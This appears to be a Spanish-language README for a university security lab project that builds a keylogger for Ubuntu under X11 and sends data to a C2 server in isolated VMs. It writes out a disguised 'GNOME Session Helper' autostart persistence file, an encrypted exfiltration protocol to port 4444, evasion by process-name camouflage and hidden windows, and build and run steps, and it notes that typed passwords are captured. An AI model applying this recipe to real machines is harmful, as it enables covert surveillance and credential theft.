# Proyecto Unidad 2 — Seguridad Informática
## Keylogger con Cifrado, Transmisión Segura y Evasión

> **⚠️ AVISO LEGAL:** Desarrollo exclusivamente educativo en entorno virtualizado controlado.  
> Prohibido ejecutar en dispositivos o redes de terceros sin autorización explícita.

---

## Arquitectura del Laboratorio

```
VirtualBox (PC físico)
│
├── VM 1: Parrot Linux   (ATACANTE)
│         Corre: server.py
│         IP:    192.168.100.1
│
└── VM 2: Ubuntu 24.04 LTS   (VÍCTIMA)
          Corre: dist/wsh  (keylogger compilado)
          IP:    192.168.100.2
          Sesión: X11 (no Wayland)
```

---

## ⚠️ Requisito crítico: sesión X11 en Ubuntu 24.04

Ubuntu 24.04 usa **Wayland por defecto**, pero pynput necesita **X11** para capturar el teclado globalmente. Al arrancar la VM Ubuntu:

1. En la pantalla de login de GDM, hacer clic en el usuario
2. Antes de ingresar la contraseña, clic en el ícono de engranaje ⚙️ (esquina inferior derecha)
3. Seleccionar **"Ubuntu on Xorg"**
4. Ingresar contraseña → iniciar sesión

Verificar que estás en X11:
```bash
echo $XDG_SESSION_TYPE   # debe mostrar: x11
```

---

## Estructura del Proyecto

```
Proyecto U2/
├── keylogger/
│   ├── keylogger.py          # Keylogger (víctima Ubuntu 24.04 / X11)
│   ├── server.py             # Servidor C2 (atacante Parrot Linux)
│   ├── decrypt_backup.py     # Descifra backups locales
│   ├── build.py              # Compila con PyInstaller → binario ELF
│   ├── requirements.txt      # Dependencias Python
│   └── dist/
│       └── wsh               # Binario compilado (generado por build.py)
└── informe_amenaza/
    └── threat_report.md      # Informe técnico de amenaza (Ejercicio 4)
```

---

## Ejercicio 1: Desarrollo del Keylogger

### Captura de teclado
Usa `pynput` con backend **X11** (`pynput.keyboard._xorg`) para capturar
globalmente todas las pulsaciones de teclado sin importar qué aplicación
tenga el foco.

Dos hilos paralelos:
- **`_listener_thread`**: escucha teclas vía X11 y acumula en buffer (protegido por mutex)
- **`_sender_thread`**: cada `SEND_INTERVAL` segundos, cifra y envía al C2

### Persistencia (sin privilegios root)
Se usa el estándar **XDG Autostart** de freedesktop.org, compatible con
GNOME en Ubuntu 24.04:

```
~/.config/autostart/gnome-session-helper.desktop
```

Contenido del archivo `.desktop`:
```ini
[Desktop Entry]
Type=Application
Name=GNOME Session Helper
Exec=/home/usuario/.local/bin/wsh
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
```

GNOME lee esta carpeta al iniciar sesión y ejecuta automáticamente los
programas listados, **sin requerir root** (nivel de usuario, equivalente a
`HKCU\...\Run` en Windows).

Verificar persistencia instalada:
```bash
cat ~/.config/autostart/gnome-session-helper.desktop
```

Eliminar persistencia (limpieza post-demo):
```bash
rm ~/.config/autostart/gnome-session-helper.desktop
```

### Limitaciones conocidas

| Información | ¿Se captura? | Razón técnica |
|---|---|---|
| Texto en sesión Wayland | ❌ No | pynput requiere X11 para hooking global |
| Campos SecureInput (KeePass, etc.) | ❌ No | API de accesibilidad bloqueada |
| Ctrl+Alt+Del / Super+L | ❌ No | Interceptadas por el kernel/compositor |
| Texto pegado con el ratón | ❌ No | Requiere módulo de clipboard adicional |
| Caracteres de IME (CJK) | Parcial | Depende de la configuración del sistema |
| Texto en campos de contraseña HTML | ✅ Sí (parcial) | Solo si el usuario escribe; no el autocompletado |
| Contraseñas escritas en terminal | ✅ Sí | X11 no distingue campo de contraseña |

---

## Ejercicio 2: Cifrado y Envío de Datos

### Algoritmo: AES-256-GCM

**Distinción hash vs cifrado:**

| Concepto | MD5 / SHA-256 | AES-256-GCM |
|---|---|---|
| Tipo | Hash (unidireccional) | Cifrado simétrico autenticado |
| Reversible | ❌ No | ✅ Sí (con la clave) |
| Propósito | Verificar integridad | Confidencialidad + integridad |
| Válido para cifrar | ❌ MD5 está roto | ✅ Estándar NIST actual |

AES-256-GCM es **AEAD** (Authenticated Encryption with Associated Data):
cifra y autentica en una operación. El nonce de 96 bits se genera
aleatoriamente en cada envío (nunca se repite).

### Gestión de la clave
La clave AES está **embebida** en el ejecutable:
- **Ventaja**: simplicidad, no requiere infraestructura PKI.
- **Desventaja**: análisis estático del binario (`strings dist/wsh`) puede revelarla.
- **Alternativa segura**: ECDH para negociar clave dinámicamente; solo la
  clave pública del servidor estaría embebida.

### Protocolo TCP
```
Keylogger (víctima) → Servidor C2 (atacante):
  [4 bytes big-endian: longitud]
  [12 bytes: nonce AES aleatorio]
  [N bytes: ciphertext + tag GCM (16 bytes)]

Servidor → Keylogger:
  [4 bytes ACK: 0x00 0xAC 0x00 0x4B]
```

### Configurar intervalo de envío
Editar `SEND_INTERVAL` en `keylogger.py` (por defecto 30 segundos):
```python
SEND_INTERVAL: int = 30   # cambiar según necesidad
```

---

## Ejercicio 3: MITM, Evasión y Mitigación

### Ataque MITM con Parrot Linux

En la VM Parrot (atacante), capturar el tráfico con Wireshark:
```bash
sudo wireshark &
# Filtro: tcp.port == 4444
```

O con tcpdump:
```bash
sudo tcpdump -i eth0 tcp port 4444 -w captura_mitm.pcap
```

**Resultado**: el payload interceptado es ilegible sin la clave AES.
En Wireshark se verá:
```
Data: 5A4EDE3D F0E24CBB D4AADEFD ...  ← nonce (12 bytes, aleatorio)
      7F3A91BC E042D8F1 ...            ← ciphertext ilegible
```

Si el tag GCM es alterado, `decrypt_payload()` lanza `InvalidTag` →
el servidor detecta la manipulación automáticamente.

### Compilación del ejecutable (en VM Ubuntu 24.04)

```bash
# 1. Instalar Python y dependencias en Ubuntu 24.04
sudo apt update
sudo apt install python3-pip python3-xlib -y
pip3 install pynput cryptography pyinstaller --break-system-packages

# 2. Copiar la carpeta keylogger/ a la VM Ubuntu
#    (via carpeta compartida VirtualBox o scp)

# 3. Compilar
cd keylogger/
python3 build.py

# 4. Binario generado en dist/wsh
chmod +x dist/wsh
./dist/wsh   # para probarlo
```

> **Nota**: PyInstaller genera un binario ELF específico para Linux x86_64.
> El binario de Ubuntu 24.04 solo correrá en Linux (no en Windows).

### Evasión
- Binario compilado sin ventana visible (`--noconsole`)
- Nombre camuflado: `wsh` (camuflaje de proceso) y `gnome-session-helper` (autostart)
- Subir a VirusTotal para documentar tasa de detección

---

## Ejercicio 4: Informe Técnico de Amenaza

Ver: [informe_amenaza/threat_report.md](informe_amenaza/threat_report.md)

---

## Guía de uso completa

### Paso 1: Configurar la red entre VMs (VirtualBox)

En **ambas VMs**: Configuración → Red → Adaptador 1 → **Red solo anfitrión** (Host-Only)

O configurar manualmente:
```bash
# VM Parrot (atacante)
sudo ip addr add 192.168.100.1/24 dev eth0

# VM Ubuntu (víctima)
sudo ip addr add 192.168.100.2/24 dev eth0
```

Verificar conectividad:
```bash
# Desde Ubuntu, hacer ping a Parrot
ping 192.168.100.1
```

### Paso 2: Configurar IP del C2 en el keylogger

Editar `keylogger.py` antes de compilar:
```python
C2_HOST: str = "192.168.100.1"   # IP de la VM Parrot
C2_PORT: int = 4444
```

### Paso 3: Iniciar servidor C2 en Parrot

```bash
# En VM Parrot
pip3 install cryptography
python3 server.py

# Salida esperada:
# [INFO] C2 Server escuchando en 0.0.0.0:4444
# [INFO] Log descifrado : ./logs/received.log
```

### Paso 4: Compilar y ejecutar keylogger en Ubuntu 24.04

```bash
# En VM Ubuntu (sesión X11)
python3 build.py       # compila dist/wsh
./dist/wsh             # ejecutar keylogger
```

### Paso 5: Ver datos capturados en Parrot

```bash
# En tiempo real
tail -f keylogger/logs/received.log

# Ver payloads cifrados (evidencia MITM)
xxd keylogger/logs/raw_encrypted.bin | head -30
```

### Paso 6: Descifrar backup local (si el C2 no estaba disponible)

```bash
# En VM Ubuntu (o Parrot con el archivo)
python3 decrypt_backup.py ~/.local/share/.cache_sys/session.enc
```

---

## Pauta de Evaluación

| Criterio | Puntaje | Implementación |
|---|---|---|
| **Ej. 1** — Captura de teclado | 8 pts | `_on_press()` / pynput X11 |
| **Ej. 1** — Persistencia | 6 pts | XDG Autostart `.desktop` |
| **Ej. 1** — Documentación del código | 4 pts | Docstrings completos en todas las funciones |
| **Ej. 1** — Análisis de limitaciones | 2 pts | Tabla en README + comentarios en `_on_press()` |
| **Ej. 2** — Elección y justificación del cifrado | 6 pts | AES-256-GCM; distinción hash vs cifrado |
| **Ej. 2** — Gestión de clave | 4 pts | Clave embebida con análisis de implicancias |
| **Ej. 2** — Envío periódico cifrado | 6 pts | `_sender_thread()` + `SEND_INTERVAL` configurable |
| **Ej. 2** — Descifrado | 4 pts | `server.py` + `decrypt_backup.py` |
| **Ej. 3** — Ataque MITM | 6 pts | Wireshark / tcpdump + InvalidTag GCM |
| **Ej. 3** — Ejecutable y evasión | 8 pts | PyInstaller ELF + VirusTotal |
| **Ej. 3** — Mitigación | 6 pts | Sección 6 del informe técnico |
| **Ej. 4** — Completitud del informe | 6 pts | Vector, TTPs MITRE, IoCs, impacto |
| **Ej. 4** — Calidad y redacción | 4 pts | Estilo threat intelligence |
| **TOTAL** | **70 pts** | |
